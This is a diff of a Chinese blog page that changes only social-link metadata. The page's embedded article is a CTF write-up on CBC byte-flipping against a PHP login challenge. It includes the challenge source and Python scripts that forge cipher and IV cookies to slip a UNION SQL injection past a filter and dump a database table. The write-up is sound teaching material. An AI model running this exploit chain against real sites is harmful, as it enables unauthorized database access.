@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"cbc加解密过程先看一下cbc加密和解密的过程 \n\n\n加密\n\n解密\n\nIV   初始化向量\nPlaintext  明文\nCiphertext  密文\nkey密钥 \n加密 ：1 先分组，得到第一组明文 A\n2 第一组明文和IV进行异或 得到中间值B\n3 B在经过key进行加密得到密文C\n4 密文C与第二组明文进行异或\n5 中间值在经过key加密得到\n6 循环下去，得到最终的密文\n解密 ：1 先分组，得到第一组密文C\n2 C先经过key解密得到中间值B\n3 B在和IV经过异或，就得到了明文A\n4 第二组密文经过key解密得到中间值\n5 中间值和第一组密文C异或，得到第二组明文\ncbc字节翻转攻击原理先来看一个异或的知识点\n假设X=Y^Z  那么 Y=X^Z   Z=X^Y\nZ^Z=X^Y^Z  =0      异或的一个特性 两个相同的数异或 等于0\n推论==&gt;\nY^Q^Z=X^Q  如果给Y异或上Q 那么最后的结果就是原来的值异或上Q  X^Q\n约定Y为第二组经过了key解密但没有进行异或的密文  Q为想要伪造的数据   Z为第一组的密文 X为第二组解密之后的明文  这样就可以伪造第二组的明文了\n实例实验吧的一道题\n源码如下 \n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpdefine(&quot;SECRET_KEY&quot;, &apos;***********&apos;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);error_reporting(0);include(&apos;conn.php&apos;);function sqliCheck($str)&#123;\tif(preg_match(&quot;/\\\\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;function get_random_iv()&#123;    $random_iv=&apos;&apos;;    for($i=0;$i&lt;16;$i++)&#123;        $random_iv.=chr(rand(1,255));    &#125;    return $random_iv;&#125;function login($info)&#123;\t$iv = get_random_iv();\t$plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function show_homepage()&#123;\tglobal $link;    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);            $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;            $result=mysqli_query($link,$sql);                        if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;            \t$rows=mysqli_fetch_array($result);\t\t\t\techo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;\t\t\t&#125;\t\t\telse&#123;\t\t\t\techo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;\t\t\t&#125;        &#125;else&#123;            die(&quot;ERROR!&quot;);        &#125;    &#125;&#125;if(isset($_POST[&apos;id&apos;]))&#123;    $id = (string)$_POST[&apos;id&apos;];    if(sqliCheck($id))\t\tdie(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);    $info = array(&apos;id&apos;=&gt;$id);    login($info);    echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;&#125;else&#123;    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123;        show_homepage();    &#125;else&#123;        echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;                        &lt;div class=&quot;header&quot;&gt;                        &lt;h1&gt;Login Form&lt;/h1&gt;                        &lt;span&gt;input id to login&lt;/span&gt;                        &lt;/div&gt;                        &lt;div class=&quot;content&quot;&gt;                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt;                        &lt;/div&gt;                        &lt;div class=&quot;footer&quot;&gt;                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;                        &lt;/div&gt;                    &lt;/form&gt;                &lt;/div&gt;            &lt;/body&gt;&apos;;    &#125;&#125;\n\n只看cbc部分\n先分组16个字节为一组(根据IV是16个字节，推测16个字节为1组)\na:1:{s:2:”id”;s:    \n2:”12”;}\n目的是把第二组的2替换为#，\n约定第二组解密之后的没有进行异或的密文为C，A为最后的明文，B为第一组的密文\n正常情况：C[4]^B[4]=2\n现在我们想把2改为#\nc[4]^B[4]^2^#=2^2^#=#\n就是把B[4]对应的位置改为B[4]^2^# 这样C[4]和新的B[4]异或之后的结果就是#\n贴一下pcat大佬的脚本\n123456789101112131415# -*- coding:utf8 -*-__author__='pcat@chamd5.org'from base64 import *import urllibcipher='kHRJKBNzNjwYUrCRzdAIkRexNpIYnA2jjcfBrTOkgO8%3D'cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)print(lst)idx=4c1='2'c2='#'lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=''.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new\n\n这样构造会提示不能反序列化，因为第一组密文被改变 但是解密第一组密文的IV没有变，所以报错\nIV的构造\n​    new_cipher：在上一步生成的新的cipher经url和base64解码并使用秘钥解密后的结果(报错界面返回的结果)\n​    old_iv：第一次提交时得到的iv值经url和base64解密后的结果\n​    error_plain：new_cipher与old_iv异或运算得到的字符串\n​    right_plain：最原始的序列化之后的字符串的第一行（因为iv只在第一组密文解密的时候会被用到）\n​                之所以不需要全写，是因为第二行是绝对不会出错的，这在上一步已经说明过了\n​    new_iv：我们想要的新的iv值\n​    \n​    我们想达到这个目的：\n​        new_cipher^new_iv=right_plain\n​    由CBC的加密解密过程我们可以知道：\n​        new_cipher^old_iv=error_plain\n​        任意值与自己本身做异或运算的结果都是0\n​        任意值与0做异或运算的结果都是自己本身\n​    只需令new_iv=old_iv^error_plain^right_plain\n12345678910111213# -*- coding:utf8 -*-__author__='pcat@chamd5.org'from base64 import *import urllibiv='Tfdy3l%2BWCmllUqxw94XpVA%3D%3D'iv_raw=b64decode(urllib.unquote(iv))  #old_ivfirst='a:1:&#123;s:2:\"id\";s:'   #right_plainplain=b64decode('eFmmV2vP6L22IXf2c/kzYTg4OiIwIHVuaW9uIHNlbGVjdCAqIGZyb20oKHNlbGVjdCAxKWEgam9pbiAoc2VsZWN0IHZhbHVlIGZyb20geW91X3dhbnQpYiBqb2luIChzZWxlY3QgMyljKTsAIjt9') #error_plainiv_new=''for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new\n\n最终的脚本\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import requestsimport refrom base64 import *from urllib import quote,unquoteurl=\"http://ctf5.shiyanbar.com/web/jiandan/index.php\"def find_flag(payload,cbc_flip_index,char_in_payload,char_to_replace):    payload = &#123;\"id\":payload&#125;    r=requests.post(url,data=payload)    iv=re.findall(\"iv=(.*?),\",r.headers['Set-Cookie'])[0]    cipher=re.findall(\"cipher=(.*)\",r.headers['Set-Cookie'])[0]    cipher=unquote(cipher)    cipher=b64decode(cipher)    cipher_list=list(cipher)    cipher_list[cbc_flip_index] = chr(ord(cipher_list[cbc_flip_index])^ord(char_in_payload)^ord(char_to_replace))    cipher_new=''.join(cipher_list)    cipher_new=b64encode(cipher_new)    cipher_new=quote(cipher_new)    cookie = &#123;'iv':iv,'cipher':cipher_new&#125;    r=requests.post(url,cookies=cookie)    content = r.content    plain_base64=re.findall(\"base64_decode\\(\\'(.*?)\\'\\)\",content)[0]    plain=b64decode(plain_base64)    first_block_plain=\"a:1:&#123;s:2:\\\"id\\\";s:\"    iv=unquote(iv)    iv=b64decode(iv)    iv_list=list(iv)    for i in range(16):        iv_list[i]=chr(ord(plain[i]) ^ ord(iv_list[i]) ^ ord(first_block_plain[i]))    iv_new=''.join(iv_list)    iv_new=b64encode(iv_new)    iv_new=quote(iv_new)    cookie = &#123;'iv':iv_new,'cipher':cipher_new&#125;    r=requests.post(url,cookies=cookie)    return r.content#这个函数的目的是为了判断Union中select的次数，也就是说需要暴力破解处you_want表中的字段列数量def get_columns_count():    table_name=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'g', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'G', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']    for i in range(len(table_name)):        payload=\"(select 1)a\"        if i==0:            payload = \"0 2nion select * from(\"+payload+\");\"+chr(0);            content=find_flag(payload,6,'2','u')            resp=re.findall(\".*(Hello!)(\\d).*\",content)            if resp:                print \"table has 1 column and response position is 1\"                return payload            else:                print \"table does not have %d columns\" % (i+1)            continue        for t in range(i):            payload=payload+\" join (select %d)%s\" % (t+2,table_name[t+1])        payload = \"0 2nion select * from(\"+payload+\");\"+chr(0);        content=find_flag(payload,6,'2','u')        resp=re.findall(\".*(Hello!)(\\d).*\",content)        if resp:            print \"table has %d column and response position is %s\" % (i+1,resp[0][1])            return payload        else:            print \"table does not have %d columns\" % (i+1)payload=get_columns_count()print payloadprint find_flag('12',4,'2','#')# 下面加chr(0)是为了注释掉后面的内容, 且只要替换掉 2union 中的 2 就可以了print find_flag('0 2nion select * from((select 1)a);'+chr(0),6,'2','u')print find_flag('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u')print find_flag('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u')print find_flag(\"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);\"+chr(0),7,'2','u')print find_flag(\"0 2nion select * from((select 1)a join (select value from you_want)b join (select 3)c);\"+chr(0),6,'2','u')\n\n这里要替换的字符是第二组的2 改成# 所以要修改的分组应该是第二组之前的分组，因为cbc模式下，每个分组的加密和解密结果 依赖该分组前面的分组，所以保证该分组前面的分组被正确加解密，该分组就不会出现错误\n参考连接\nhttps://blog.csdn.net/include_heqile/article/details/79942993\nhttps://pengyang.me/2018/11/20/%E5%AE%9E%E9%AA%8C%E5%90%A7web/#0x04-%E8%8E%B7%E5%8F%96-flag\n","dateCreated":"2019-09-14T16:12:01+08:00","dateModified":"2019-10-16T11:14:40+08:00","datePublished":"2019-09-14T16:12:01+08:00","description":"cbc加解密过程先看一下cbc加密和解密的过程 ","headline":"CBC字节翻转","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/14/CBC字节翻转/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/14/CBC字节翻转/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"cbc加解密过程先看一下cbc加密和解密的过程 \n\n\n加密\n\n解密\n\nIV   初始化向量\nPlaintext  明文\nCiphertext  密文\nkey密钥 \n加密 ：1 先分组，得到第一组明文 A\n2 第一组明文和IV进行异或 得到中间值B\n3 B在经过key进行加密得到密文C\n4 密文C与第二组明文进行异或\n5 中间值在经过key加密得到\n6 循环下去，得到最终的密文\n解密 ：1 先分组，得到第一组密文C\n2 C先经过key解密得到中间值B\n3 B在和IV经过异或，就得到了明文A\n4 第二组密文经过key解密得到中间值\n5 中间值和第一组密文C异或，得到第二组明文\ncbc字节翻转攻击原理先来看一个异或的知识点\n假设X=Y^Z  那么 Y=X^Z   Z=X^Y\nZ^Z=X^Y^Z  =0      异或的一个特性 两个相同的数异或 等于0\n推论==&gt;\nY^Q^Z=X^Q  如果给Y异或上Q 那么最后的结果就是原来的值异或上Q  X^Q\n约定Y为第二组经过了key解密但没有进行异或的密文  Q为想要伪造的数据   Z为第一组的密文 X为第二组解密之后的明文  这样就可以伪造第二组的明文了\n实例实验吧的一道题\n源码如下 \n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?phpdefine(&quot;SECRET_KEY&quot;, &apos;***********&apos;);define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);error_reporting(0);include(&apos;conn.php&apos;);function sqliCheck($str)&#123;\tif(preg_match(&quot;/\\\\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;function get_random_iv()&#123;    $random_iv=&apos;&apos;;    for($i=0;$i&lt;16;$i++)&#123;        $random_iv.=chr(rand(1,255));    &#125;    return $random_iv;&#125;function login($info)&#123;\t$iv = get_random_iv();\t$plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function show_homepage()&#123;\tglobal $link;    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);            $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;            $result=mysqli_query($link,$sql);                        if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;            \t$rows=mysqli_fetch_array($result);\t\t\t\techo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;\t\t\t&#125;\t\t\telse&#123;\t\t\t\techo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;\t\t\t&#125;        &#125;else&#123;            die(&quot;ERROR!&quot;);        &#125;    &#125;&#125;if(isset($_POST[&apos;id&apos;]))&#123;    $id = (string)$_POST[&apos;id&apos;];    if(sqliCheck($id))\t\tdie(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);    $info = array(&apos;id&apos;=&gt;$id);    login($info);    echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;&#125;else&#123;    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123;        show_homepage();    &#125;else&#123;        echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;                        &lt;div class=&quot;header&quot;&gt;                        &lt;h1&gt;Login Form&lt;/h1&gt;                        &lt;span&gt;input id to login&lt;/span&gt;                        &lt;/div&gt;                        &lt;div class=&quot;content&quot;&gt;                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt;                        &lt;/div&gt;                        &lt;div class=&quot;footer&quot;&gt;                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;                        &lt;/div&gt;                    &lt;/form&gt;                &lt;/div&gt;            &lt;/body&gt;&apos;;    &#125;&#125;\n\n只看cbc部分\n先分组16个字节为一组(根据IV是16个字节，推测16个字节为1组)\na:1:{s:2:”id”;s:    \n2:”12”;}\n目的是把第二组的2替换为#，\n约定第二组解密之后的没有进行异或的密文为C，A为最后的明文，B为第一组的密文\n正常情况：C[4]^B[4]=2\n现在我们想把2改为#\nc[4]^B[4]^2^#=2^2^#=#\n就是把B[4]对应的位置改为B[4]^2^# 这样C[4]和新的B[4]异或之后的结果就是#\n贴一下pcat大佬的脚本\n123456789101112131415# -*- coding:utf8 -*-__author__='pcat@chamd5.org'from base64 import *import urllibcipher='kHRJKBNzNjwYUrCRzdAIkRexNpIYnA2jjcfBrTOkgO8%3D'cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)print(lst)idx=4c1='2'c2='#'lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=''.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new\n\n这样构造会提示不能反序列化，因为第一组密文被改变 但是解密第一组密文的IV没有变，所以报错\nIV的构造\n​    new_cipher：在上一步生成的新的cipher经url和base64解码并使用秘钥解密后的结果(报错界面返回的结果)\n​    old_iv：第一次提交时得到的iv值经url和base64解密后的结果\n​    error_plain：new_cipher与old_iv异或运算得到的字符串\n​    right_plain：最原始的序列化之后的字符串的第一行（因为iv只在第一组密文解密的时候会被用到）\n​                之所以不需要全写，是因为第二行是绝对不会出错的，这在上一步已经说明过了\n​    new_iv：我们想要的新的iv值\n​    \n​    我们想达到这个目的：\n​        new_cipher^new_iv=right_plain\n​    由CBC的加密解密过程我们可以知道：\n​        new_cipher^old_iv=error_plain\n​        任意值与自己本身做异或运算的结果都是0\n​        任意值与0做异或运算的结果都是自己本身\n​    只需令new_iv=old_iv^error_plain^right_plain\n12345678910111213# -*- coding:utf8 -*-__author__='pcat@chamd5.org'from base64 import *import urllibiv='Tfdy3l%2BWCmllUqxw94XpVA%3D%3D'iv_raw=b64decode(urllib.unquote(iv))  #old_ivfirst='a:1:&#123;s:2:\"id\";s:'   #right_plainplain=b64decode('eFmmV2vP6L22IXf2c/kzYTg4OiIwIHVuaW9uIHNlbGVjdCAqIGZyb20oKHNlbGVjdCAxKWEgam9pbiAoc2VsZWN0IHZhbHVlIGZyb20geW91X3dhbnQpYiBqb2luIChzZWxlY3QgMyljKTsAIjt9') #error_plainiv_new=''for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new\n\n最终的脚本\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import requestsimport refrom base64 import *from urllib import quote,unquoteurl=\"http://ctf5.shiyanbar.com/web/jiandan/index.php\"def find_flag(payload,cbc_flip_index,char_in_payload,char_to_replace):    payload = &#123;\"id\":payload&#125;    r=requests.post(url,data=payload)    iv=re.findall(\"iv=(.*?),\",r.headers['Set-Cookie'])[0]    cipher=re.findall(\"cipher=(.*)\",r.headers['Set-Cookie'])[0]    cipher=unquote(cipher)    cipher=b64decode(cipher)    cipher_list=list(cipher)    cipher_list[cbc_flip_index] = chr(ord(cipher_list[cbc_flip_index])^ord(char_in_payload)^ord(char_to_replace))    cipher_new=''.join(cipher_list)    cipher_new=b64encode(cipher_new)    cipher_new=quote(cipher_new)    cookie = &#123;'iv':iv,'cipher':cipher_new&#125;    r=requests.post(url,cookies=cookie)    content = r.content    plain_base64=re.findall(\"base64_decode\\(\\'(.*?)\\'\\)\",content)[0]    plain=b64decode(plain_base64)    first_block_plain=\"a:1:&#123;s:2:\\\"id\\\";s:\"    iv=unquote(iv)    iv=b64decode(iv)    iv_list=list(iv)    for i in range(16):        iv_list[i]=chr(ord(plain[i]) ^ ord(iv_list[i]) ^ ord(first_block_plain[i]))    iv_new=''.join(iv_list)    iv_new=b64encode(iv_new)    iv_new=quote(iv_new)    cookie = &#123;'iv':iv_new,'cipher':cipher_new&#125;    r=requests.post(url,cookies=cookie)    return r.content#这个函数的目的是为了判断Union中select的次数，也就是说需要暴力破解处you_want表中的字段列数量def get_columns_count():    table_name=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'g', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'G', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']    for i in range(len(table_name)):        payload=\"(select 1)a\"        if i==0:            payload = \"0 2nion select * from(\"+payload+\");\"+chr(0);            content=find_flag(payload,6,'2','u')            resp=re.findall(\".*(Hello!)(\\d).*\",content)            if resp:                print \"table has 1 column and response position is 1\"                return payload            else:                print \"table does not have %d columns\" % (i+1)            continue        for t in range(i):            payload=payload+\" join (select %d)%s\" % (t+2,table_name[t+1])        payload = \"0 2nion select * from(\"+payload+\");\"+chr(0);        content=find_flag(payload,6,'2','u')        resp=re.findall(\".*(Hello!)(\\d).*\",content)        if resp:            print \"table has %d column and response position is %s\" % (i+1,resp[0][1])            return payload        else:            print \"table does not have %d columns\" % (i+1)payload=get_columns_count()print payloadprint find_flag('12',4,'2','#')# 下面加chr(0)是为了注释掉后面的内容, 且只要替换掉 2union 中的 2 就可以了print find_flag('0 2nion select * from((select 1)a);'+chr(0),6,'2','u')print find_flag('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u')print find_flag('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u')print find_flag(\"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);\"+chr(0),7,'2','u')print find_flag(\"0 2nion select * from((select 1)a join (select value from you_want)b join (select 3)c);\"+chr(0),6,'2','u')\n\n这里要替换的字符是第二组的2 改成# 所以要修改的分组应该是第二组之前的分组，因为cbc模式下，每个分组的加密和解密结果 依赖该分组前面的分组，所以保证该分组前面的分组被正确加解密，该分组就不会出现错误\n参考连接\nhttps://blog.csdn.net/include_heqile/article/details/79942993\nhttps://pengyang.me/2018/11/20/%E5%AE%9E%E9%AA%8C%E5%90%A7web/#0x04-%E8%8E%B7%E5%8F%96-flag\n","dateCreated":"2019-09-14T16:12:01+08:00","dateModified":"2019-10-16T11:14:40+08:00","datePublished":"2019-09-14T16:12:01+08:00","description":"cbc加解密过程先看一下cbc加密和解密的过程 ","headline":"CBC字节翻转","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/14/CBC字节翻转/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/09/14/CBC字节翻转/"}</script>
     <meta name="description" content="cbc加解密过程先看一下cbc加密和解密的过程">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="CBC字节翻转">
@@ -167,138 +167,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
